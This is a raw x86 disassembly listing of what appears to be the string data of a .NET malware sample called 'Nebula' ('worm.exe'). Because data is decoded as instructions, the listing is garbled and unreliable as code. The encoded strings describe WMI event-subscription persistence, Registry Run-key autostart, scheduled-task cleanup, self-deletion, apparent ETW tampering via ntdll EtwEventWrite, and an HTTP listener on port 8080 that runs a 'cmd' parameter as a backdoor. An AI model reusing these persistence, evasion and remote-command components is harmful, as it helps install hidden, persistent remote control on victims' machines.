  409663:	00 6d 00             	add    %ch,0x0(%ebp)
  409666:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40966a:	70 00                	jo     0x40966c
  40966c:	61                   	popa
  40966d:	00 63 00             	add    %ah,0x0(%ebx)
  409670:	65 00 3a             	add    %bh,%gs:(%edx)
  409673:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  409677:	00 72 00             	add    %dh,0x0(%edx)
  40967a:	6f                   	outsl  %ds:(%esi),(%dx)
  40967b:	00 6f 00             	add    %ch,0x0(%edi)
  40967e:	74 00                	je     0x409680
  409680:	5c                   	pop    %esp
  409681:	00 73 00             	add    %dh,0x0(%ebx)
  409684:	75 00                	jne    0x409686
  409686:	62 00                	bound  %eax,(%eax)
  409688:	73 00                	jae    0x40968a
  40968a:	63 00                	arpl   %eax,(%eax)
  40968c:	72 00                	jb     0x40968e
  40968e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409694:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40969a:	20 00                	and    %al,(%eax)
  40969c:	50                   	push   %eax
  40969d:	00 41 00             	add    %al,0x0(%ecx)
  4096a0:	54                   	push   %esp
  4096a1:	00 48 00             	add    %cl,0x0(%eax)
  4096a4:	20 00                	and    %al,(%eax)
  4096a6:	5f                   	pop    %edi
  4096a7:	00 5f 00             	add    %bl,0x0(%edi)
  4096aa:	46                   	inc    %esi
  4096ab:	00 69 00             	add    %ch,0x0(%ecx)
  4096ae:	6c                   	insb   (%dx),%es:(%edi)
  4096af:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4096b3:	00 72 00             	add    %dh,0x0(%edx)
  4096b6:	54                   	push   %esp
  4096b7:	00 6f 00             	add    %ch,0x0(%edi)
  4096ba:	43                   	inc    %ebx
  4096bb:	00 6f 00             	add    %ch,0x0(%edi)
  4096be:	6e                   	outsb  %ds:(%esi),(%dx)
  4096bf:	00 73 00             	add    %dh,0x0(%ebx)
  4096c2:	75 00                	jne    0x4096c4
  4096c4:	6d                   	insl   (%dx),%es:(%edi)
  4096c5:	00 65 00             	add    %ah,0x0(%ebp)
  4096c8:	72 00                	jb     0x4096ca
  4096ca:	42                   	inc    %edx
  4096cb:	00 69 00             	add    %ch,0x0(%ecx)
  4096ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cf:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4096d3:	00 6e 00             	add    %ch,0x0(%esi)
  4096d6:	67 00 20             	add    %ah,(%bx,%si)
  4096d9:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  4096dd:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4096e1:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  4096e5:	00 00                	add    %al,(%eax)
  4096e7:	5b                   	pop    %ebx
  4096e8:	53                   	push   %ebx
  4096e9:	00 6f 00             	add    %ch,0x0(%edi)
  4096ec:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4096f1:	00 61 00             	add    %ah,0x0(%ecx)
  4096f4:	72 00                	jb     0x4096f6
  4096f6:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4096fb:	00 69 00             	add    %ch,0x0(%ecx)
  4096fe:	63 00                	arpl   %eax,(%eax)
  409700:	72 00                	jb     0x409702
  409702:	6f                   	outsl  %ds:(%esi),(%dx)
  409703:	00 73 00             	add    %dh,0x0(%ebx)
  409706:	6f                   	outsl  %ds:(%esi),(%dx)
  409707:	00 66 00             	add    %ah,0x0(%esi)
  40970a:	74 00                	je     0x40970c
  40970c:	5c                   	pop    %esp
  40970d:	00 57 00             	add    %dl,0x0(%edi)
  409710:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409716:	6f                   	outsl  %ds:(%esi),(%dx)
  409717:	00 77 00             	add    %dh,0x0(%edi)
  40971a:	73 00                	jae    0x40971c
  40971c:	5c                   	pop    %esp
  40971d:	00 43 00             	add    %al,0x0(%ebx)
  409720:	75 00                	jne    0x409722
  409722:	72 00                	jb     0x409724
  409724:	72 00                	jb     0x409726
  409726:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40972a:	74 00                	je     0x40972c
  40972c:	56                   	push   %esi
  40972d:	00 65 00             	add    %ah,0x0(%ebp)
  409730:	72 00                	jb     0x409732
  409732:	73 00                	jae    0x409734
  409734:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40973a:	5c                   	pop    %esp
  40973b:	00 52 00             	add    %dl,0x0(%edx)
  40973e:	75 00                	jne    0x409740
  409740:	6e                   	outsb  %ds:(%esi),(%dx)
  409741:	00 00                	add    %al,(%eax)
  409743:	80 ab 2f 00 63 00 20 	subb   $0x20,0x63002f(%ebx)
  40974a:	00 73 00             	add    %dh,0x0(%ebx)
  40974d:	63 00                	arpl   %eax,(%eax)
  40974f:	68 00 74 00 61       	push   $0x61007400
  409754:	00 73 00             	add    %dh,0x0(%ebx)
  409757:	6b 00 73             	imul   $0x73,(%eax),%eax
  40975a:	00 20                	add    %ah,(%eax)
  40975c:	00 2f                	add    %ch,(%edi)
  40975e:	00 71 00             	add    %dh,0x0(%ecx)
  409761:	75 00                	jne    0x409763
  409763:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409767:	79 00                	jns    0x409769
  409769:	20 00                	and    %al,(%eax)
  40976b:	7c 00                	jl     0x40976d
  40976d:	20 00                	and    %al,(%eax)
  40976f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  409773:	6e                   	outsb  %ds:(%esi),(%dx)
  409774:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  409778:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40977c:	00 20                	add    %ah,(%eax)
  40977e:	00 2f                	add    %ch,(%edi)
  409780:	00 69 00             	add    %ch,0x0(%ecx)
  409783:	20 00                	and    %al,(%eax)
  409785:	22 00                	and    (%eax),%al
  409787:	4e                   	dec    %esi
  409788:	00 65 00             	add    %ah,0x0(%ebp)
  40978b:	62 00                	bound  %eax,(%eax)
  40978d:	75 00                	jne    0x40978f
  40978f:	6c                   	insb   (%dx),%es:(%edi)
  409790:	00 61 00             	add    %ah,0x0(%ecx)
  409793:	22 00                	and    (%eax),%al
  409795:	20 00                	and    %al,(%eax)
  409797:	3e 00 6e 00          	add    %ch,%ds:0x0(%esi)
  40979b:	75 00                	jne    0x40979d
  40979d:	6c                   	insb   (%dx),%es:(%edi)
  40979e:	00 20                	add    %ah,(%eax)
  4097a0:	00 26                	add    %ah,(%esi)
  4097a2:	00 26                	add    %ah,(%esi)
  4097a4:	00 20                	add    %ah,(%eax)
  4097a6:	00 73 00             	add    %dh,0x0(%ebx)
  4097a9:	63 00                	arpl   %eax,(%eax)
  4097ab:	68 00 74 00 61       	push   $0x61007400
  4097b0:	00 73 00             	add    %dh,0x0(%ebx)
  4097b3:	6b 00 73             	imul   $0x73,(%eax),%eax
  4097b6:	00 20                	add    %ah,(%eax)
  4097b8:	00 2f                	add    %ch,(%edi)
  4097ba:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4097be:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4097c2:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4097c6:	00 20                	add    %ah,(%eax)
  4097c8:	00 2f                	add    %ch,(%edi)
  4097ca:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  4097ce:	00 20                	add    %ah,(%eax)
  4097d0:	00 22                	add    %ah,(%edx)
  4097d2:	00 4e 00             	add    %cl,0x0(%esi)
  4097d5:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  4097d9:	75 00                	jne    0x4097db
  4097db:	6c                   	insb   (%dx),%es:(%edi)
  4097dc:	00 61 00             	add    %ah,0x0(%ecx)
  4097df:	54                   	push   %esp
  4097e0:	00 61 00             	add    %ah,0x0(%ecx)
  4097e3:	73 00                	jae    0x4097e5
  4097e5:	6b 00 22             	imul   $0x22,(%eax),%eax
  4097e8:	00 20                	add    %ah,(%eax)
  4097ea:	00 2f                	add    %ch,(%edi)
  4097ec:	00 66 00             	add    %ah,0x0(%esi)
  4097ef:	00 0d 4e 00 65 00    	add    %cl,0x65004e
  4097f5:	62 00                	bound  %eax,(%eax)
  4097f7:	75 00                	jne    0x4097f9
  4097f9:	6c                   	insb   (%dx),%es:(%edi)
  4097fa:	00 61 00             	add    %ah,0x0(%ecx)
  4097fd:	00 11                	add    %dl,(%ecx)
  4097ff:	77 00                	ja     0x409801
  409801:	6f                   	outsl  %ds:(%esi),(%dx)
  409802:	00 72 00             	add    %dh,0x0(%edx)
  409805:	6d                   	insl   (%dx),%es:(%edi)
  409806:	00 2e                	add    %ch,(%esi)
  409808:	00 65 00             	add    %ah,0x0(%ebp)
  40980b:	78 00                	js     0x40980d
  40980d:	65 00 00             	add    %al,%gs:(%eax)
  409810:	29 2f                	sub    %ebp,(%edi)
  409812:	00 63 00             	add    %ah,0x0(%ebx)
  409815:	20 00                	and    %al,(%eax)
  409817:	74 00                	je     0x409819
  409819:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40981f:	6f                   	outsl  %ds:(%esi),(%dx)
  409820:	00 75 00             	add    %dh,0x0(%ebp)
  409823:	74 00                	je     0x409825
  409825:	20 00                	and    %al,(%eax)
  409827:	32 00                	xor    (%eax),%al
  409829:	20 00                	and    %al,(%eax)
  40982b:	26 00 20             	add    %ah,%es:(%eax)
  40982e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409832:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  409836:	00 22                	add    %ah,(%edx)
  409838:	00 00                	add    %al,(%eax)
  40983a:	03 22                	add    (%edx),%esp
  40983c:	00 00                	add    %al,(%eax)
  40983e:	07                   	pop    %es
  40983f:	5c                   	pop    %esp
  409840:	00 73 00             	add    %dh,0x0(%ebx)
  409843:	2b 00                	sub    (%eax),%eax
  409845:	00 01                	add    %al,(%ecx)
  409847:	00 53 54             	add    %dl,0x54(%ebx)
  40984a:	00 48 00             	add    %cl,0x0(%eax)
  40984d:	49                   	dec    %ecx
  40984e:	00 53 00             	add    %dl,0x0(%ebx)
  409851:	20 00                	and    %al,(%eax)
  409853:	49                   	dec    %ecx
  409854:	00 53 00             	add    %dl,0x0(%ebx)
  409857:	20 00                	and    %al,(%eax)
  409859:	41                   	inc    %ecx
  40985a:	00 20                	add    %ah,(%eax)
  40985c:	00 45 00             	add    %al,0x0(%ebp)
  40985f:	58                   	pop    %eax
  409860:	00 41 00             	add    %al,0x0(%ecx)
  409863:	4d                   	dec    %ebp
  409864:	00 50 00             	add    %dl,0x0(%eax)
  409867:	4c                   	dec    %esp
  409868:	00 45 00             	add    %al,0x0(%ebp)
  40986b:	20 00                	and    %al,(%eax)
  40986d:	3d 00 20 00 34       	cmp    $0x34002000,%eax
  409872:	00 41 00             	add    %al,0x0(%ecx)
  409875:	20 00                	and    %al,(%eax)
  409877:	35 00 41 00 20       	xor    $0x20004100,%eax
  40987c:	00 39                	add    %bh,(%ecx)
  40987e:	00 30                	add    %dh,(%eax)
  409880:	00 20                	add    %ah,(%eax)
  409882:	00 41 00             	add    %al,0x0(%ecx)
  409885:	4e                   	dec    %esi
  409886:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40988a:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40988e:	00 45 00             	add    %al,0x0(%ebp)
  409891:	20 00                	and    %al,(%eax)
  409893:	52                   	push   %edx
  409894:	00 45 00             	add    %al,0x0(%ebp)
  409897:	53                   	push   %ebx
  409898:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40989c:	19 65 00             	sbb    %esp,0x0(%ebp)
  40989f:	78 00                	js     0x4098a1
  4098a1:	70 00                	jo     0x4098a3
  4098a3:	6c                   	insb   (%dx),%es:(%edi)
  4098a4:	00 6f 00             	add    %ch,0x0(%edi)
  4098a7:	72 00                	jb     0x4098a9
  4098a9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4098ad:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4098b1:	78 00                	js     0x4098b3
  4098b3:	65 00 00             	add    %al,%gs:(%eax)
  4098b6:	13 6e 00             	adc    0x0(%esi),%ebp
  4098b9:	74 00                	je     0x4098bb
  4098bb:	64 00 6c 00 6c       	add    %ch,%fs:0x6c(%eax,%eax,1)
  4098c0:	00 2e                	add    %ch,(%esi)
  4098c2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  4098c6:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4098ca:	1b 45 00             	sbb    0x0(%ebp),%eax
  4098cd:	74 00                	je     0x4098cf
  4098cf:	77 00                	ja     0x4098d1
  4098d1:	45                   	inc    %ebp
  4098d2:	00 76 00             	add    %dh,0x0(%esi)
  4098d5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4098d9:	74 00                	je     0x4098db
  4098db:	57                   	push   %edi
  4098dc:	00 72 00             	add    %dh,0x0(%edx)
  4098df:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  4098e5:	00 81 09 53 00 45    	add    %al,0x45005309(%ecx)
  4098eb:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4098ef:	00 43 00             	add    %al,0x0(%ebx)
  4098f2:	54                   	push   %esp
  4098f3:	00 20                	add    %ah,(%eax)
  4098f5:	00 2a                	add    %ch,(%edx)
  4098f7:	00 20                	add    %ah,(%eax)
  4098f9:	00 46 00             	add    %al,0x0(%esi)
  4098fc:	52                   	push   %edx
  4098fd:	00 4f 00             	add    %cl,0x0(%edi)
  409900:	4d                   	dec    %ebp
  409901:	00 20                	add    %ah,(%eax)
  409903:	00 5f 00             	add    %bl,0x0(%edi)
  409906:	5f                   	pop    %edi
  409907:	00 49 00             	add    %cl,0x0(%ecx)
  40990a:	6e                   	outsb  %ds:(%esi),(%dx)
  40990b:	00 73 00             	add    %dh,0x0(%ebx)
  40990e:	74 00                	je     0x409910
  409910:	61                   	popa
  409911:	00 6e 00             	add    %ch,0x0(%esi)
  409914:	63 00                	arpl   %eax,(%eax)
  409916:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40991a:	6f                   	outsl  %ds:(%esi),(%dx)
  40991b:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40991f:	00 66 00             	add    %ah,0x0(%esi)
  409922:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  409928:	74 00                	je     0x40992a
  40992a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409930:	45                   	inc    %ebp
  409931:	00 76 00             	add    %dh,0x0(%esi)
  409934:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409938:	74 00                	je     0x40993a
  40993a:	20 00                	and    %al,(%eax)
  40993c:	57                   	push   %edi
  40993d:	00 49 00             	add    %cl,0x0(%ecx)
  409940:	54                   	push   %esp
  409941:	00 48 00             	add    %cl,0x0(%eax)
  409944:	49                   	dec    %ecx
  409945:	00 4e 00             	add    %cl,0x0(%esi)
  409948:	20 00                	and    %al,(%eax)
  40994a:	36 00 30             	add    %dh,%ss:(%eax)
  40994d:	00 20                	add    %ah,(%eax)
  40994f:	00 57 00             	add    %dl,0x0(%edi)
  409952:	48                   	dec    %eax
  409953:	00 45 00             	add    %al,0x0(%ebp)
  409956:	52                   	push   %edx
  409957:	00 45 00             	add    %al,0x0(%ebp)
  40995a:	20 00                	and    %al,(%eax)
  40995c:	54                   	push   %esp
  40995d:	00 61 00             	add    %ah,0x0(%ecx)
  409960:	72 00                	jb     0x409962
  409962:	67 00 65 00          	add    %ah,0x0(%di)
  409966:	74 00                	je     0x409968
  409968:	49                   	dec    %ecx
  409969:	00 6e 00             	add    %ch,0x0(%esi)
  40996c:	73 00                	jae    0x40996e
  40996e:	74 00                	je     0x409970
  409970:	61                   	popa
  409971:	00 6e 00             	add    %ch,0x0(%esi)
  409974:	63 00                	arpl   %eax,(%eax)
  409976:	65 00 20             	add    %ah,%gs:(%eax)
  409979:	00 49 00             	add    %cl,0x0(%ecx)
  40997c:	53                   	push   %ebx
  40997d:	00 41 00             	add    %al,0x0(%ecx)
  409980:	20 00                	and    %al,(%eax)
  409982:	27                   	daa
  409983:	00 57 00             	add    %dl,0x0(%edi)
  409986:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40998c:	32 00                	xor    (%eax),%al
  40998e:	5f                   	pop    %edi
  40998f:	00 43 00             	add    %al,0x0(%ebx)
  409992:	6f                   	outsl  %ds:(%esi),(%dx)
  409993:	00 6d 00             	add    %ch,0x0(%ebp)
  409996:	70 00                	jo     0x409998
  409998:	75 00                	jne    0x40999a
  40999a:	74 00                	je     0x40999c
  40999c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4099a0:	53                   	push   %ebx
  4099a1:	00 79 00             	add    %bh,0x0(%ecx)
  4099a4:	73 00                	jae    0x4099a6
  4099a6:	74 00                	je     0x4099a8
  4099a8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4099ac:	27                   	daa
  4099ad:	00 20                	add    %ah,(%eax)
  4099af:	00 41 00             	add    %al,0x0(%ecx)
  4099b2:	4e                   	dec    %esi
  4099b3:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4099b7:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  4099bb:	00 72 00             	add    %dh,0x0(%edx)
  4099be:	67 00 65 00          	add    %ah,0x0(%di)
  4099c2:	74 00                	je     0x4099c4
  4099c4:	49                   	dec    %ecx
  4099c5:	00 6e 00             	add    %ch,0x0(%esi)
  4099c8:	73 00                	jae    0x4099ca
  4099ca:	74 00                	je     0x4099cc
  4099cc:	61                   	popa
  4099cd:	00 6e 00             	add    %ch,0x0(%esi)
  4099d0:	63 00                	arpl   %eax,(%eax)
  4099d2:	65 00 2e             	add    %ch,%gs:(%esi)
  4099d5:	00 53 00             	add    %dl,0x0(%ebx)
  4099d8:	74 00                	je     0x4099da
  4099da:	61                   	popa
  4099db:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4099df:	00 73 00             	add    %dh,0x0(%ebx)
  4099e2:	20 00                	and    %al,(%eax)
  4099e4:	3d 00 20 00 27       	cmp    $0x27002000,%eax
  4099e9:	00 4f 00             	add    %cl,0x0(%edi)
  4099ec:	4b                   	dec    %ebx
  4099ed:	00 27                	add    %ah,(%edi)
  4099ef:	00 01                	add    %al,(%ecx)
  4099f1:	2b 5c 00 5c          	sub    0x5c(%eax,%eax,1),%ebx
  4099f5:	00 2e                	add    %ch,(%esi)
  4099f7:	00 5c 00 72          	add    %bl,0x72(%eax,%eax,1)
  4099fb:	00 6f 00             	add    %ch,0x0(%edi)
  4099fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ff:	00 74 00 5c          	add    %dh,0x5c(%eax,%eax,1)
  409a03:	00 73 00             	add    %dh,0x0(%ebx)
  409a06:	75 00                	jne    0x409a08
  409a08:	62 00                	bound  %eax,(%eax)
  409a0a:	73 00                	jae    0x409a0c
  409a0c:	63 00                	arpl   %eax,(%eax)
  409a0e:	72 00                	jb     0x409a10
  409a10:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409a16:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409a1c:	00 1b                	add    %bl,(%ebx)
  409a1e:	5f                   	pop    %edi
  409a1f:	00 5f 00             	add    %bl,0x0(%edi)
  409a22:	45                   	inc    %ebp
  409a23:	00 76 00             	add    %dh,0x0(%esi)
  409a26:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409a2a:	74 00                	je     0x409a2c
  409a2c:	46                   	inc    %esi
  409a2d:	00 69 00             	add    %ch,0x0(%ecx)
  409a30:	6c                   	insb   (%dx),%es:(%edi)
  409a31:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409a35:	00 72 00             	add    %dh,0x0(%edx)
  409a38:	00 09                	add    %cl,(%ecx)
  409a3a:	4e                   	dec    %esi
  409a3b:	00 61 00             	add    %ah,0x0(%ecx)
  409a3e:	6d                   	insl   (%dx),%es:(%edi)
  409a3f:	00 65 00             	add    %ah,0x0(%ebp)
  409a42:	00 19                	add    %bl,(%ecx)
  409a44:	4e                   	dec    %esi
  409a45:	00 65 00             	add    %ah,0x0(%ebp)
  409a48:	62 00                	bound  %eax,(%eax)
  409a4a:	75 00                	jne    0x409a4c
  409a4c:	6c                   	insb   (%dx),%es:(%edi)
  409a4d:	00 61 00             	add    %ah,0x0(%ecx)
  409a50:	46                   	inc    %esi
  409a51:	00 69 00             	add    %ch,0x0(%ecx)
  409a54:	6c                   	insb   (%dx),%es:(%edi)
  409a55:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409a59:	00 72 00             	add    %dh,0x0(%edx)
  409a5c:	00 0b                	add    %cl,(%ebx)
  409a5e:	51                   	push   %ecx
  409a5f:	00 75 00             	add    %dh,0x0(%ebp)
  409a62:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409a66:	79 00                	jns    0x409a68
  409a68:	00 1b                	add    %bl,(%ebx)
  409a6a:	51                   	push   %ecx
  409a6b:	00 75 00             	add    %dh,0x0(%ebp)
  409a6e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409a72:	79 00                	jns    0x409a74
  409a74:	4c                   	dec    %esp
  409a75:	00 61 00             	add    %ah,0x0(%ecx)
  409a78:	6e                   	outsb  %ds:(%esi),(%dx)
  409a79:	00 67 00             	add    %ah,0x0(%edi)
  409a7c:	75 00                	jne    0x409a7e
  409a7e:	61                   	popa
  409a7f:	00 67 00             	add    %ah,0x0(%edi)
  409a82:	65 00 00             	add    %al,%gs:(%eax)
  409a85:	07                   	pop    %es
  409a86:	57                   	push   %edi
  409a87:	00 51 00             	add    %dl,0x0(%ecx)
  409a8a:	4c                   	dec    %esp
  409a8b:	00 00                	add    %al,(%eax)
  409a8d:	1d 45 00 76 00       	sbb    $0x760045,%eax
  409a92:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409a96:	74 00                	je     0x409a98
  409a98:	4e                   	dec    %esi
  409a99:	00 61 00             	add    %ah,0x0(%ecx)
  409a9c:	6d                   	insl   (%dx),%es:(%edi)
  409a9d:	00 65 00             	add    %ah,0x0(%ebp)
  409aa0:	73 00                	jae    0x409aa2
  409aa2:	70 00                	jo     0x409aa4
  409aa4:	61                   	popa
  409aa5:	00 63 00             	add    %ah,0x0(%ebx)
  409aa8:	65 00 00             	add    %al,%gs:(%eax)
  409aab:	15 72 00 6f 00       	adc    $0x6f0072,%eax
  409ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab1:	00 74 00 5c          	add    %dh,0x5c(%eax,%eax,1)
  409ab5:	00 43 00             	add    %al,0x0(%ebx)
  409ab8:	49                   	dec    %ecx
  409ab9:	00 4d 00             	add    %cl,0x0(%ebp)
  409abc:	56                   	push   %esi
  409abd:	00 32                	add    %dh,(%edx)
  409abf:	00 00                	add    %al,(%eax)
  409ac1:	31 43 00             	xor    %eax,0x0(%ebx)
  409ac4:	6f                   	outsl  %ds:(%esi),(%dx)
  409ac5:	00 6d 00             	add    %ch,0x0(%ebp)
  409ac8:	6d                   	insl   (%dx),%es:(%edi)
  409ac9:	00 61 00             	add    %ah,0x0(%ecx)
  409acc:	6e                   	outsb  %ds:(%esi),(%dx)
  409acd:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  409ad1:	00 69 00             	add    %ch,0x0(%ecx)
  409ad4:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad5:	00 65 00             	add    %ah,0x0(%ebp)
  409ad8:	45                   	inc    %ebp
  409ad9:	00 76 00             	add    %dh,0x0(%esi)
  409adc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409ae0:	74 00                	je     0x409ae2
  409ae2:	43                   	inc    %ebx
  409ae3:	00 6f 00             	add    %ch,0x0(%edi)
  409ae6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae7:	00 73 00             	add    %dh,0x0(%ebx)
  409aea:	75 00                	jne    0x409aec
  409aec:	6d                   	insl   (%dx),%es:(%edi)
  409aed:	00 65 00             	add    %ah,0x0(%ebp)
  409af0:	72 00                	jb     0x409af2
  409af2:	00 1d 4e 00 65 00    	add    %bl,0x65004e
  409af8:	62 00                	bound  %eax,(%eax)
  409afa:	75 00                	jne    0x409afc
  409afc:	6c                   	insb   (%dx),%es:(%edi)
  409afd:	00 61 00             	add    %ah,0x0(%ecx)
  409b00:	43                   	inc    %ebx
  409b01:	00 6f 00             	add    %ch,0x0(%edi)
  409b04:	6e                   	outsb  %ds:(%esi),(%dx)
  409b05:	00 73 00             	add    %dh,0x0(%ebx)
  409b08:	75 00                	jne    0x409b0a
  409b0a:	6d                   	insl   (%dx),%es:(%edi)
  409b0b:	00 65 00             	add    %ah,0x0(%ebp)
  409b0e:	72 00                	jb     0x409b10
  409b10:	00 27                	add    %ah,(%edi)
  409b12:	43                   	inc    %ebx
  409b13:	00 6f 00             	add    %ch,0x0(%edi)
  409b16:	6d                   	insl   (%dx),%es:(%edi)
  409b17:	00 6d 00             	add    %ch,0x0(%ebp)
  409b1a:	61                   	popa
  409b1b:	00 6e 00             	add    %ch,0x0(%esi)
  409b1e:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  409b23:	00 6e 00             	add    %ch,0x0(%esi)
  409b26:	65 00 54 00 65       	add    %dl,%gs:0x65(%eax,%eax,1)
  409b2b:	00 6d 00             	add    %ch,0x0(%ebp)
  409b2e:	70 00                	jo     0x409b30
  409b30:	6c                   	insb   (%dx),%es:(%edi)
  409b31:	00 61 00             	add    %ah,0x0(%ecx)
  409b34:	74 00                	je     0x409b36
  409b36:	65 00 00             	add    %al,%gs:(%eax)
  409b39:	33 5f 00             	xor    0x0(%edi),%ebx
  409b3c:	5f                   	pop    %edi
  409b3d:	00 46 00             	add    %al,0x0(%esi)
  409b40:	69 00 6c 00 74 00    	imul   $0x74006c,(%eax),%eax
  409b46:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409b4a:	54                   	push   %esp
  409b4b:	00 6f 00             	add    %ch,0x0(%edi)
  409b4e:	43                   	inc    %ebx
  409b4f:	00 6f 00             	add    %ch,0x0(%edi)
  409b52:	6e                   	outsb  %ds:(%esi),(%dx)
  409b53:	00 73 00             	add    %dh,0x0(%ebx)
  409b56:	75 00                	jne    0x409b58
  409b58:	6d                   	insl   (%dx),%es:(%edi)
  409b59:	00 65 00             	add    %ah,0x0(%ebp)
  409b5c:	72 00                	jb     0x409b5e
  409b5e:	42                   	inc    %edx
  409b5f:	00 69 00             	add    %ch,0x0(%ecx)
  409b62:	6e                   	outsb  %ds:(%esi),(%dx)
  409b63:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  409b67:	00 6e 00             	add    %ch,0x0(%esi)
  409b6a:	67 00 00             	add    %al,(%bx,%si)
  409b6d:	0d 46 00 69 00       	or     $0x690046,%eax
  409b72:	6c                   	insb   (%dx),%es:(%edi)
  409b73:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409b77:	00 72 00             	add    %dh,0x0(%edx)
  409b7a:	00 11                	add    %dl,(%ecx)
  409b7c:	43                   	inc    %ebx
  409b7d:	00 6f 00             	add    %ch,0x0(%edi)
  409b80:	6e                   	outsb  %ds:(%esi),(%dx)
  409b81:	00 73 00             	add    %dh,0x0(%ebx)
  409b84:	75 00                	jne    0x409b86
  409b86:	6d                   	insl   (%dx),%es:(%edi)
  409b87:	00 65 00             	add    %ah,0x0(%ebp)
  409b8a:	72 00                	jb     0x409b8c
  409b8c:	00 1d 68 00 74 00    	add    %bl,0x740068
  409b92:	74 00                	je     0x409b94
  409b94:	70 00                	jo     0x409b96
  409b96:	3a 00                	cmp    (%eax),%al
  409b98:	2f                   	das
  409b99:	00 2f                	add    %ch,(%edi)
  409b9b:	00 2b                	add    %ch,(%ebx)
  409b9d:	00 3a                	add    %bh,(%edx)
  409b9f:	00 38                	add    %bh,(%eax)
  409ba1:	00 30                	add    %dh,(%eax)
  409ba3:	00 38                	add    %bh,(%eax)
  409ba5:	00 30                	add    %dh,(%eax)
  409ba7:	00 2f                	add    %ch,(%edi)
  409ba9:	00 00                	add    %al,(%eax)
  409bab:	07                   	pop    %es
  409bac:	63 00                	arpl   %eax,(%eax)
  409bae:	6d                   	insl   (%dx),%es:(%edi)
  409baf:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  409bb3:	33 4e 00             	xor    0x0(%esi),%ecx
  409bb6:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb7:	00 20                	add    %ah,(%eax)
  409bb9:	00 27                	add    %ah,(%edi)
  409bbb:	00 63 00             	add    %ah,0x0(%ebx)
  409bbe:	6d                   	insl   (%dx),%es:(%edi)
  409bbf:	00 64 00 27          	add    %ah,0x27(%eax,%eax,1)
  409bc3:	00 20                	add    %ah,(%eax)
  409bc5:	00 70 00             	add    %dh,0x0(%eax)
  409bc8:	61                   	popa
  409bc9:	00 72 00             	add    %dh,0x0(%edx)
  409bcc:	61                   	popa
  409bcd:	00 6d 00             	add    %ch,0x0(%ebp)
  409bd0:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  409bd5:	00 72 00             	add    %dh,0x0(%edx)
  409bd8:	20 00                	and    %al,(%eax)
  409bda:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409bde:	76 00                	jbe    0x409be0
  409be0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409be4:	2e 00 01             	add    %al,%cs:(%ecx)
